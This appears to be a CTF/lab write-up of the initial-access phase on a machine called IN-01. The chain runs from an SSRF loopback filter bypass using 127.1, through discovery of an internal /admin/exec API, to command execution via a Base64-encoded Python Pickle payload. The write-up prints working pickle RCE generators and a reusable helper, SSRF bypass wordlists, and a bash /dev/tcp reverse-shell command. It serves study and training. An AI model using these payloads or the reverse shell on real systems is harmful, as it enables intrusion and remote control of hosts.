---
type: machine-phase
project: OSCP-Exam-PoC
machine: IN-01
difficulty: Insane
phase: initial-access
status: completed
platform: Linux
initial_user: web
initial_access: SSRF filter bypass followed by Python Pickle deserialization
services:
  - HTTP
  - SSH
  - Gunicorn
  - Python
execution_method: In-band command execution through HTTP
user_flag_status: confirmed-submitted
tags:
  - oscp
  - insane
  - linux
  - ssrf
  - filter-bypass
  - internal-service-discovery
  - python
  - pickle
  - deserialization
  - rce
flag_submitted: true
---
# IN-01 — User Foothold

> **Flag completion:** User flag obtained and submitted (confirmed by the examination participant). Public value: `IT{FLAG-SECRET}`.

## 1. Objective

**Objective:** Gain user-level access to IN-01 and retrieve the contents of `user.txt`.

The successful initial-access chain was:

<figure class="attack-chain-figure attack-chain-figure--compact">
  <img src="/diagrams/in-01-user-objective-flowchart.svg" alt="Compact ten-step flowchart with downward arrows: Public Link Preview Application, /fetch?url=, SSRF, loopback filter bypass via 127.1, internal Admin API at 127.1:9000, /admin/exec, data parameter, Base64-encoded Python Pickle, remote command execution and web UID 1000." width="440" height="1011" loading="lazy" decoding="async" />
  <figcaption>Ten connected stages, retaining the original Objective flow. The foothold used in-band HTTP command execution as <code>web</code>, not an interactive SSH session.</figcaption>
</figure>

The target did not require an interactive SSH session for initial access. The successful foothold was established through command execution returned directly in the HTTP response.

## 2. Target Information and Instance History

### 2.1 Initial Challenge Information

The challenge instructions were:

```
Start IN-01 from the Machines page, then attack your instance at the address shown there.

Gain user-level access and submit the contents of user.txt.
```

The first assigned instance provided:

|Service|Endpoint|
|---|---|
|HTTP|`http://x.x.x.x:PORT_O`|
|SSH|`x.x.x.x:PORT_C`|

The instance was automatically destroyed at:

```
2026-11-05T13:07:59.809528Z
```

### 2.2 Subsequent Instance Mappings

The lab was restarted during the investigation. The public IP remained unchanged, but the forwarded ports changed.

|Instance|HTTP Port|SSH Port|Role in Investigation|
|---|---|---|---|
|Initial|PORT_O|PORT_C|Initial challenge information|
|Subsequent|PORT_K|PORT_A|SSRF research and service discovery|
|Final|PORT_J|PORT_M|Successful exploitation and root completion|

**Final target mapping:**

```
HTTP:
http://x.x.x.x:PORT_J

SSH:
ssh user@x.x.x.x -p PORT_M
```

The final exploitation chain documented below used the final mapping.

### 2.3 Public Application

The website displayed:

```
<h1>IT GATE Link Preview</h1>
<p>Preview any public URL:</p>
<p><code>GET /fetch?url=https://example.com</code></p>
<p><em>Internal addresses are blocked for security.</em></p>
```

The main application endpoint was:

```
/fetch?url=
```

The application's server header identified:

```
Gunicorn
```

The challenge presented a URL-preview feature that fetched URLs from the server side and returned the response.

This was the primary attack surface.

## 3. External Reconnaissance

### 3.1 Nmap Enumeration

A service/version scan was performed against the assigned HTTP and SSH ports of the subsequent instance.

Command:

```
mkdir -p ~/Desktop/IN01/nmap

nmap -Pn -n -sV -sC \
  -p PORT_K,PORT_A \
  --script http-title,http-headers,http-server-header,http-methods,ssh-hostkey,ssh2-enum-algos \
  -oA ~/Desktop/IN01/nmap/initial-enum \
  x.x.x.x
```

Relevant output:

```
PORT      STATE SERVICE VERSION
PORT_A/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)

PORT_K/tcp open  http    Gunicorn
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| http-headers:
|   Server: gunicorn
|   Content-Type: text/html; charset=utf-8
|   Content-Length: 244
|_  (Request type: HEAD)

| http-methods:
|_  Supported Methods: HEAD OPTIONS GET
|_http-server-header: gunicorn
```

The SSH service fingerprint was:

```
OpenSSH 10.0p2 Debian 7+deb13u4
```

The HTTP service was served by Gunicorn.

This scan was performed before the final instance mapping was assigned. The final mapping used HTTP port `PORT_J` and SSH port `PORT_M`.

### 3.2 WhatWeb Fingerprinting

Command:

```
whatweb -v http://x.x.x.x:PORT_K/
```

Relevant output:

```
Status    : 200 OK
Title     : <None>
IP        : x.x.x.x
Country   : SWITZERLAND, CH

Summary   : HTTPServer[gunicorn]
```

The server header confirmed Gunicorn.

### 3.3 Inspect the Main Page

Command:

```
curl -sS -i --max-time 10 \
  http://x.x.x.x:PORT_K/
```

Response:

```
HTTP/1.1 200 OK
Server: gunicorn
Content-Type: text/html; charset=utf-8
Content-Length: 244
```

Body:

```
<!-- preview-service build token: IT{FLAG-SECRET}} -->
<h1>IT GATE Link Preview</h1>
<p>Preview any public URL:</p>
<p><code>GET /fetch?url=https://example.com</code></p>
<p><em>Internal addresses are blocked for security.</em></p>
```

The build token was a canary value in the page source. It was not established as the user flag.

### 3.4 Fetch Endpoint Baseline

Command:

```
curl -sS -i --max-time 10 \
  http://x.x.x.x:PORT_K/fetch
```

Response:

```
HTTP/1.1 400 BAD REQUEST
Content-Length: 25
```

Body:

```
only http(s) urls allowed
```

This indicated that the endpoint expected an HTTP or HTTPS URL.

A valid public URL was then supplied:

```
curl -i -G --max-time 15 \
  --data-urlencode 'url=https://example.com' \
  'http://x.x.x.x:PORT_K/fetch'
```

The application returned the fetched Example Domain HTML:

```
HTTP/1.1 200 OK
Content-Length: 577
```

**Finding:** The application performed server-side HTTP requests and returned the fetched response body.

This confirmed the SSRF attack surface.

## 4. SSRF — Internal Address Filter Bypass

### 4.1 Initial URL Tests

The application claimed to block internal addresses.

A controlled list of loopback representations was tested.

Wordlist:

```
https://example.com
http://127.0.0.1/
http://localhost/
http://127.1/
http://2130706433/
http://0x7f000001/
http://0177.0.0.1/
http://[::1]/
```

The list was executed using FFUF:

```
ffuf \
  -w ~/Desktop/IN01/ssrf-urls.txt:URL \
  -u 'http://x.x.x.x:PORT_K/fetch?url=URL' \
  -enc 'URL:urlencode' \
  -mc all \
  -t 3 \
  -rate 3 \
  -timeout 10 \
  -of json \
  -o ~/Desktop/IN01/ssrf-results.json
```

Results:

|Input|HTTP Status|Size|Observation|
|---|---|---|---|
|`https://example.com`|200|577|Public fetch worked|
|`127.0.0.1`|403|25|Blocked|
|`localhost`|403|25|Blocked|
|`127.1`|502|230|Different processing path|
|`2130706433`|502|240|Different processing path|
|`0x7f000001`|502|240|Different processing path|
|`0177.0.0.1`|502|240|Different processing path|
|`[::1]`|403|25|Blocked|

The `502` responses were investigated rather than immediately treated as successful bypasses.

### 4.2 Inspect the 502 Responses

Command:

```
TARGET='http://x.x.x.x:PORT_K/fetch'

for target_url in \
    'http://127.1/' \
    'http://2130706433/' \
    'http://0x7f000001/' \
    'http://0177.0.0.1/'
do
    printf '\n========== %s ==========\n' "$target_url"

    curl -sS -i -G --max-time 10 \
        --data-urlencode "url=$target_url" \
        "$TARGET"
done
```

Representative response:

```
HTTP/1.1 502 BAD GATEWAY

fetch error: HTTPConnectionPool(host='127.1', port=80):
Max retries exceeded with url: /
(Caused by NewConnectionError(
"HTTPConnection(host='127.1', port=80):
Failed to establish a new connection: [Errno 111] Connection refused"
))
```

The important difference was that the application attempted a connection to the alternative loopback representation.

The connection was refused because nothing was listening on port 80.

The other numeric representations produced the same type of connection-refused result.

**Finding:** The alternative loopback representations passed the application's apparent filter and reached the HTTP client's connection stage.

<badge color="success">SSRF filter bypass confirmed</badge>

The most useful representation was:

```
127.1
```

This was used for the subsequent internal service discovery.

## 5. Internal Service Discovery

### 5.1 Build a Port Wordlist

SecLists was not installed at the expected location:

```
/usr/share/seclists/Fuzzing/
```

Rather than install another package, the investigation used the system's existing `/etc/services` file to generate a TCP port list.

Command:

```
awk '$2 ~ /^[0-9]+\/tcp$/ {
    split($2, service_port, "/");
    print service_port[1]
}' /etc/services | sort -nu > ~/Desktop/IN01/tcp-ports.txt
```

The resulting wordlist contained 217 ports.

### 5.2 Fuzz Internal Loopback Ports

Command:

```
ffuf \
  -w ~/Desktop/IN01/tcp-ports.txt:PORT \
  -u 'http://x.x.x.x:PORT_K/fetch?url=http%3A%2F%2F127.1%3APORT%2F' \
  -mc all \
  -t 5 \
  -rate 5 \
  -timeout 5 \
  -of json \
  -o ~/Desktop/IN01/loopback-ports.json
```

Most ports returned similar connection-refused responses.

Two results stood out:

|Internal Port|HTTP Status|Response Size|Duration|
|---|---|---|---|
|22|502|98 bytes|389 ms|
|8080|502|90 bytes|4.27 seconds|

These were investigated individually.

### 5.3 Internal Port 22 — SSH

Command:

```
curl -i -sS -G --max-time 12 \
  --data-urlencode 'url=http://127.1:22/' \
  'http://x.x.x.x:PORT_K/fetch'
```

Response:

```
HTTP/1.1 502 BAD GATEWAY

fetch error: ('Connection aborted.',
BadStatusLine('SSH-2.0-OpenSSH_10.0p2 Debian-7+deb13u4\r\n'))
```

The response contained an SSH protocol banner:

```
SSH-2.0-OpenSSH_10.0p2 Debian-7+deb13u4
```

The HTTP client attempted to interpret the SSH response as HTTP, which caused the `BadStatusLine` error.

**Finding:** An internal SSH service was reachable through the SSRF primitive.

### 5.4 Internal Port 8080

Command:

```
curl -i -sS -G --max-time 12 \
  --data-urlencode 'url=http://127.1:8080/' \
  'http://x.x.x.x:PORT_K/fetch'
```

Response:

```
HTTP/1.1 502 BAD GATEWAY

fetch error: HTTPConnectionPool(host='127.1', port=8080):
Read timed out. (read timeout=4)
```

Additional paths were tested:

```
/robots.txt
/health
/api
/flag
/admin
```

They produced the same read-timeout behavior.

Guessed internal hostnames such as `admin`, `backend`, `api`, `metadata`, and `metadata.svc.internal` failed DNS resolution.

No useful application content was obtained from port 8080 during this phase.

### 5.5 Public Application Endpoint Checks

The following external routes were checked:

```
/
/robots.txt
/sitemap.xml
/api
/api/
/api/upstreams
/openapi.json
/docs
/health
/healthz
```

At one point, the HTTP service stopped returning responses, and these requests timed out.

The public `/fetch` endpoint later recovered and returned the Example Domain HTML again.

The timeout cause was not conclusively established.

**Methodological decision:** The investigation stopped spending time on the unresponsive 8080 service and moved toward identifying the internal application's actual route and input contract.

## 6. Internal Admin API Discovery

### 6.1 Reach the Internal API

The root path of the internal service was tested through the public fetch endpoint:

```
curl -sS --max-time 5 -i -G \
  --data-urlencode 'url=http://127.1:9000/' \
  'http://x.x.x.x:PORT_J/fetch'
```

Response:

```
HTTP/1.1 200 OK
Server: gunicorn
Content-Type: text/html; charset=utf-8
Content-Length: 44
```

Body:

```
IT GATE internal admin API (localhost only)
```

This established that port 9000 hosted the internal administrative API.

The service was reachable from the target application through the `127.1` loopback representation.

### 6.2 Establish the Negative-Control Response

A nonexistent route was requested:

```
curl -sS --max-time 7 -G \
  --data-urlencode 'url=http://127.1:9000/definitely-not-a-real-route-94821' \
  -w '\nHTTP=%{http_code} SIZE=%{size_download} TIME=%{time_total}s\n' \
  'http://x.x.x.x:PORT_K/fetch'
```

Output:

```
HTTP=404
SIZE=207
```

This 207-byte response became the negative-control fingerprint for subsequent endpoint fuzzing.

### 6.3 Generic API Endpoint Fuzzing

An initial API path list was created with candidates such as:

```
health
healthz
status
info
version
docs
redoc
openapi.json
swagger.json
api
admin
admin/health
admin/status
admin/flag
admin/user
admin/users
flag
user
users
config
debug
metrics
internal
robots.txt
```

FFUF command:

```
ffuf \
  -w ~/Desktop/IN01/admin-api-paths.txt:ENDPOINT \
  -u 'http://x.x.x.x:PORT_K/fetch?url=http%3A%2F%2F127.1%3A9000%2FENDPOINT' \
  -enc 'ENDPOINT:urlencode' \
  -mc all \
  -fs 90 \
  -t 5 \
  -rate 5 \
  -timeout 7 \
  -of json \
  -o ~/Desktop/IN01/admin-api-results.json
```

All 34 candidates returned the same generic response:

```
HTTP 404
Size: 207 bytes
```

No useful route was identified.

### 6.4 API-Specific Wordlist

The SecLists API endpoint wordlist was used for a broader scan.

A subsequent scan used:

```
ffuf \
  -w ~/Desktop/IN01/admin-api-wordlist.txt:FUZZ \
  -u 'http://x.x.x.x:PORT_J/fetch?url=http%3A%2F%2F127.1%3A9000%2FFUZZ' \
  -enc 'FUZZ:urlencode' \
  -mc all \
  -fs 207 \
  -t 40 \
  -rate 0 \
  -timeout 3 \
  -maxtime 45 \
  -of json \
  -o ~/Desktop/IN01/admin-api-fast.json
```

The scan produced no useful matches.

Automatic calibration was also tried, but the resulting JSON contained:

```
{
  "results_count": 0,
  "results": []
}
```

The investigation stopped expanding generic path wordlists.

### 6.5 Targeted Administrative Routes

A targeted list was then used, including:

```
admin/exec
admin/execute
admin/command
admin/run
admin/shell
admin/ssh
admin/keys
admin/config
admin/secrets
internal/admin
internal/exec
execute
command
shell
run
credentials
```

Command:

```
ffuf \
  -w ~/Desktop/IN01/admin-api-targeted.txt:FUZZ \
  -u 'http://x.x.x.x:PORT_J/fetch?url=http%3A%2F%2F127.1%3A9000%2FFUZZ' \
  -enc 'FUZZ:urlencode' \
  -mc all \
  -fc 404 \
  -t 40 \
  -rate 0 \
  -timeout 4 \
  -maxtime 30 \
  -of json \
  -o ~/Desktop/IN01/admin-api-targeted.json
```

This produced the first useful response:

```
400    23    5    /admin/exec
```

Unlike the generic 404 responses, `/admin/exec` returned a 400 response with a different body length.

**Finding:** `/admin/exec` was a valid route worth investigating.

## 7. Identify the Input Parameter

### 7.1 Inspect `/admin/exec`

Command:

```
curl -sS --max-time 8 -i -G \
  --data-urlencode 'url=http://127.1:9000/admin/exec' \
  'http://x.x.x.x:PORT_J/fetch'
```

Response:

```
HTTP/1.1 400 BAD REQUEST
Content-Length: 23
```

Body:

```
error: Ran out of input
```

The response suggested that the handler attempted to parse an input value that was missing or empty.

### 7.2 Parameter Fuzzing

A parameter wordlist was obtained from SecLists:

```
Discovery/Web-Content/burp-parameter-names.txt
```

The parameter scan used a harmless test value:

```
ffuf \
  -w ~/Desktop/IN01/burp-parameter-names.txt:PARAM \
  -u 'http://x.x.x.x:PORT_J/fetch?url=http%3A%2F%2F127.1%3A9000%2Fadmin%2Fexec%3FPARAM%3Dx' \
  -enc 'PARAM:urlencode' \
  -mc all \
  -fr 'Ran out of input' \
  -t 40 \
  -rate 0 \
  -timeout 3 \
  -of json \
  -o ~/Desktop/IN01/admin-exec-parameters.json
```

The first attempt had a `-maxtime 60` setting, which terminated the entire scan after 60 seconds. That was the cause of the warning, not individual request errors.

The corrected scan completed and returned:

```
400    105    18    .../admin/exec?data=x
403     25     3    .../admin/exec?dnslocalhost=x
```

The `data` parameter was the relevant candidate.

### 7.3 Inspect `data=x`

Command:

```
curl -sS --max-time 6 -i -G \
  --data-urlencode 'url=http://127.1:9000/admin/exec?data=x' \
  'http://x.x.x.x:PORT_J/fetch'
```

Response:

```
HTTP/1.1 400 BAD REQUEST
Content-Length: 105
```

Body:

```
error: Invalid base64-encoded string: number of data characters (1) cannot be 1 more than a multiple of 4
```

The empty parameter was also tested:

```
curl -sS --max-time 6 -i -G \
  --data-urlencode 'url=http://127.1:9000/admin/exec?data=' \
  'http://x.x.x.x:PORT_J/fetch'
```

Response:

```
HTTP/1.1 400 BAD REQUEST
Content-Length: 23

error: Ran out of input
```

The processing sequence was now clear:

1. The handler reads `data`.
    
2. It Base64-decodes the parameter.
    
3. It passes the decoded bytes to a deserializer.
    

The `Ran out of input` error was consistent with Python Pickle deserialization receiving an empty byte stream.

## 8. Python Pickle Deserialization to RCE

### 8.1 Exploit Construction

The initial proof-of-execution payload used Python's Pickle protocol 4.

The object's `__reduce__` method returned an `eval` invocation that executed a subprocess command.

The command requested:

```
id
whoami
pwd
```

Payload generation:

```
cd ~/Desktop/IN01

DATA=$(python3 - <<'PY'
import base64
import pickle

class Exploit:
    def __reduce__(self):
        return (
            eval,
            ("__import__('subprocess').check_output('id; whoami; pwd', shell=True, text=True)",)
        )

print(base64.b64encode(
    pickle.dumps(Exploit(), protocol=4)
).decode())
PY
)
```

The serialized object was passed to the internal endpoint through the public fetch application:

```
curl -sS --max-time 10 -G \
  --data-urlencode "url=http://127.1:9000/admin/exec?data=$DATA" \
  'http://x.x.x.x:PORT_J/fetch'
```

### 8.2 RCE Confirmation

Actual response:

```
'uid=1000(web) gid=1000(web) groups=1000(web)\nweb\n/opt/app\n'
```

This confirmed command execution on the target.

|Attribute|Result|
|---|---|
|User|`web`|
|UID|`1000`|
|GID|`1000`|
|Hostname|`insane`|
|Working directory|`/opt/app`|
|Execution method|Pickle deserialization through internal API|
|Output delivery|HTTP response|

<badge color="success">RCE confirmed</badge>

This was a successful remote command-execution foothold.

The reverse-shell attempts described later did not invalidate this result. The in-band RCE continued to work.

## 9. Reusable In-Band Execution

A helper function was created to avoid manually rebuilding the Pickle payload for every command.

The function, reconstructed from the examination record:

```
ssrf_exec() {
    local remote_cmd="$1"
    local data

    data=$(REMOTE_CMD="$remote_cmd" python3 - <<'PY'
import os
import base64
import pickle

class Exploit:
    def __reduce__(self):
        cmd = os.environ["REMOTE_CMD"]
        expression = (
            "__import__('subprocess').run("
            + repr(cmd)
            + ", shell=True, stdout=-1, stderr=-2, text=True).stdout"
        )
        return eval, (expression,)

print(base64.b64encode(
    pickle.dumps(Exploit(), protocol=4)
).decode())
PY
    ) || return 1

    curl -sS --max-time 12 -G \
        --data-urlencode "url=http://127.1:9000/admin/exec?data=$data" \
        'http://x.x.x.x:PORT_J/fetch'

    printf '\n'
}
```

Example usage:

```
ssrf_exec 'id; hostname; pwd'
```

The function allowed subsequent enumeration to run in-band without needing an interactive shell.

**Encoding note:** Later payloads containing Base64 characters such as `+` required the nested `data` parameter to be URL-encoded separately before the complete internal URL was passed through the outer `url` parameter. This became important during reverse-shell testing.

## 10. User Flag Retrieval Attempt

The user flag was located using the current execution identity.

Command issued through the RCE mechanism:

```
cat /home/$(whoami)/user.txt
```

The command was sent using the following complete wrapper:

```
REMOTE_CMD='cat /home/$(whoami)/user.txt'

DATA=$(REMOTE_CMD="$REMOTE_CMD" python3 - <<'PY'
import os
import base64
import pickle

class Exploit:
    def __reduce__(self):
        cmd = os.environ["REMOTE_CMD"]
        expression = (
            "__import__('subprocess').run("
            + repr(cmd)
            + ", shell=True, stdout=-1, stderr=-2, text=True).stdout"
        )
        return eval, (expression,)

print(base64.b64encode(
    pickle.dumps(Exploit(), protocol=4)
).decode())
PY
)

ENC_DATA=$(DATA="$DATA" python3 -c \
'import os; from urllib.parse import quote; print(quote(os.environ["DATA"], safe=""))')

curl -sS --max-time 12 -G \
  --data-urlencode "url=http://127.1:9000/admin/exec?data=$ENC_DATA" \
  'http://x.x.x.x:PORT_J/fetch'
```

**Evidence status:**

- The command is recorded in the examination record.
    
- **Flag outcome:** Obtained and submitted (participant-confirmed). Public value: `IT{FLAG-SECRET}`.
    
- **Flag outcome:** Obtained and submitted (participant-confirmed). Public value: `IT{FLAG-SECRET}`.
    

Do not confuse the public application's canary build token with `user.txt`.

## 11. Reverse-Shell Attempts and Reversion to In-Band Execution

### 11.1 Initial Callback Plan

After confirming RCE, an interactive reverse shell was attempted.

The Kali VPN interfaces were:

```
tun0    10.10.17.123/23
tun1    10.144.220.24/22
```

A Netcat listener was started:

```
nc -lvnp 4444
```

The first callback used:

```
10.144.220.24:4444
```

### 11.2 Reverse-Shell Trigger

A script named:

```
~/Desktop/IN01/reverse-shell.sh
```

was created to generate a Pickle payload that launched Bash and redirected its input/output to the listener.

The remote command was:

```
nohup bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1' \
  >/dev/null 2>&1 </dev/null &
```

The first script version failed because the Base64 value was not URL-encoded independently.

The internal API returned:

```
error: Invalid base64-encoded string: number of data characters (281) cannot be 1 more than a multiple of 4
```

The problem was that characters in the Base64 value, particularly `+`, could be interpreted as spaces when the nested query string was parsed.

### 11.3 Corrected Nested Encoding

The script was corrected to URL-encode the Base64 value separately:

```
ENC_DATA=$(
    DATA="$DATA" python3 - <<'PY'
import os
from urllib.parse import quote

print(quote(os.environ["DATA"], safe=""))
PY
)
```

The complete internal URL was then passed through the outer fetch parameter:

```
INTERNAL_URL="${INTERNAL_API}?data=${ENC_DATA}"

curl -sS --max-time 10 -G \
    --data-urlencode "url=${INTERNAL_URL}" \
    -w '\n[HTTP %{http_code} | TIME %{time_total}s]\n' \
    "$TARGET"
```

The corrected script returned:

```
''
[HTTP 200 | TIME 0.674576s]
```

However, the Netcat listener did not receive a connection.

An HTTP 200 response indicated that the request was accepted by the public application. It did not prove that the reverse shell connected.

### 11.4 Second Callback Attempt

The callback was retried using the other VPN interface:

```
~/Desktop/IN01/reverse-shell.sh 10.10.17.123 4444
```

No incoming connection was established.

The investigation initially suspected VPN routing, but the precise reason for the callback failures was not established.

### 11.5 Return to In-Band Execution

The reverse-shell approach was abandoned.

The existing Pickle RCE remained functional, so all subsequent target commands were executed through the HTTP response.

The key distinction:

|Capability|Result|
|---|---|
|Python Pickle deserialization|Confirmed|
|Remote command execution as `web`|Confirmed|
|In-band command output over HTTP|Confirmed|
|Reverse-shell callback to `tun1`|Unsuccessful|
|Reverse-shell callback to `tun0`|Unsuccessful|
|VPN routing as the proven cause|Unverified|

**Important:** The RCE did not fail because of the VPN. The interactive reverse-shell callbacks failed. The in-band RCE remained operational and was sufficient to complete the machine.

## 12. Initial Access Attack Chain Summary

<figure class="attack-chain-figure">
  <picture>
    <source media="(max-width: 520px)" type="image/svg+xml" srcset="/diagrams/in-01-user-attack-chain-mobile.svg" />
    <img src="/diagrams/in-01-user-attack-chain.svg" alt="Detailed 19-stage IN-01 user attack chain: HTTP and SSH reconnaissance, Gunicorn, /fetch SSRF, alternative loopback 127.1, internal Admin API port 9000, route and parameter fuzzing, Base64/Pickle deserialization, malicious Pickle command execution as web, unsuccessful reverse-shell callbacks, continuing in-band RCE, and user.txt retrieval command." width="760" height="2809" loading="lazy" decoding="async" />
  </picture>
  <figcaption>All 19 original stages are preserved with source-backed details. Both reverse-shell callbacks were unsuccessful; their exact cause was not established. In-band RCE remained functional, and user flag submission is participant-confirmed.</figcaption>
</figure>

## 13. Lessons Learned

### 13.1 Do Not Treat HTTP Status Codes as Complete Evidence

The initial 502 responses were not successful HTTP fetches, but their error messages revealed that alternative loopback representations reached the connection stage.

Inspecting the response body was more useful than looking at the status code alone.

### 13.2 Separate Filter Validation from Connection Behavior

The 403 responses for canonical loopback addresses and connection-refused 502 responses for alternative representations revealed a discrepancy between the application's filtering behavior and the HTTP client's address handling.

### 13.3 Switch from Path Fuzzing to Parameter Fuzzing When the Evidence Changes

Generic endpoint scans produced no useful findings.

The response:

```
error: Ran out of input
```

changed the investigative direction. The next productive step was discovering the `data` parameter rather than downloading larger path wordlists.

### 13.4 Treat Error Messages as an Attack-Surface Fingerprint

These responses exposed the request-processing sequence:

|Error|Information|
|---|---|
|`only http(s) urls allowed`|URL scheme validation|
|`Ran out of input`|Empty deserialized input|
|`Invalid base64-encoded string`|Base64 decoding stage|
|SSH `BadStatusLine`|Internal SSH service reached|
|Connection refused|Destination was reached but no listener accepted the connection|
|Read timeout|Connection stage succeeded, but no usable response arrived|

### 13.5 Keep a Working Execution Primitive

The reverse-shell callbacks did not work.

Abandoning the RCE at that point would have been unnecessary. The in-band execution channel already provided command output and remained reliable.

### 13.6 Encode Nested Parameters Independently

The Base64 parameter was inside an internal URL, which was itself inside the public `/fetch` parameter.

Each encoding layer had to be handled separately to prevent the nested query from being corrupted.

### 13.7 Account for Shell-Specific Behavior in Tooling

The Kali Zsh `PATH` problem recurred during the investigation because a supplied command used `path` as an ordinary loop variable.

In Zsh, `path` is a special array tied to `PATH`.

The shell was restored using:

```
typeset -U path
path=(/usr/local/sbin /usr/local/bin /usr/sbin /usr/bin /sbin /bin)
rehash
```

Future scripts and commands must not use `path` as an ordinary variable name. Use `endpoint`, `target_path`, or another non-special identifier.

## 14. Evidence Registry

|Evidence ID|Description|Evidence|
|---|---|---|
|IN01-U01|Initial challenge endpoints|HTTP and SSH assignments|
|IN01-U02|External service enumeration|Nmap output|
|IN01-U03|Public application fingerprint|WhatWeb and HTTP headers|
|IN01-U04|Public fetch functionality|Example Domain response|
|IN01-U05|Canonical loopback rejection|HTTP 403 responses|
|IN01-U06|Alternative loopback behavior|HTTP 502 connection errors|
|IN01-U07|Internal SSH discovery|OpenSSH banner from port 22|
|IN01-U08|Internal API discovery|Port 9000 banner|
|IN01-U09|Generic route enumeration|FFUF output with identical 404 responses|
|IN01-U10|`/admin/exec` discovery|FFUF 400 response|
|IN01-U11|`data` parameter discovery|Parameter fuzzing output|
|IN01-U12|Base64 processing|Invalid Base64 error|
|IN01-U13|Pickle deserialization indication|Empty-input error|
|IN01-U14|RCE confirmation|`uid=1000(web)` output|
|IN01-U15|Reverse-shell failure|HTTP 200 with no callback received|
|IN01-U16|User flag retrieval attempt| Obtained and submitted (participant-confirmed) |

## 15. Final User-Stage Result

|Objective|Status|
|---|---|
|Public application reconnaissance|Completed|
|SSRF functionality identified|Confirmed|
|Loopback filter bypass|Confirmed|
|Internal Admin API discovered|Confirmed|
|`/admin/exec` identified|Confirmed|
|`data` parameter identified|Confirmed|
|Pickle-based RCE established|Confirmed|
|Execution as `web`|Confirmed|
|Interactive reverse shell|Not established|
|In-band command execution|Confirmed|
|`user.txt` retrieval command|Recorded|
| Flag outcome | Obtained and submitted (participant-confirmed) |

**Initial access result:** RCE as `web` (UID 1000) successfully established.

**Execution method used for the remaining examination:** In-band HTTP command execution through the SSRF and Pickle deserialization chain.

**Flag outcome:** Obtained and submitted (participant-confirmed). Public value: `IT{FLAG-SECRET}`.

---

## 16. Related Documentation

- [[IN-01 Overview]]
    
- [[Difficulty Levels/Insane/IN-01/root]]
    
- [[Dashboard]]
    
- [[Exam Context/Exam Overview]]
    
- [[Exam Context/Exam Timeline]]
    
- [[Exam Context/Network & Connectivity]]
    

### Reusable Techniques

- [[Reusable PoCs/SSRF/SSRF Filter Bypass]]
    
- [[Reusable PoCs/Python Pickle/Python Pickle RCE]]
    

### Difficulties and Lessons

- [[Difficulties & Lessons/Network and ISP Restrictions]]
    
- [[Difficulties & Lessons/VPN Routing and Reverse Shells]]
    
- [[Difficulties & Lessons/Kali PATH and Zsh Issues]]
    
- [[HTTP Client and Connectivity Failures]]
    
- [[Difficulties & Lessons/Fuzzing Strategy and False Leads]]
    
- [[Difficulties & Lessons/Tooling and Workflow Mistakes]]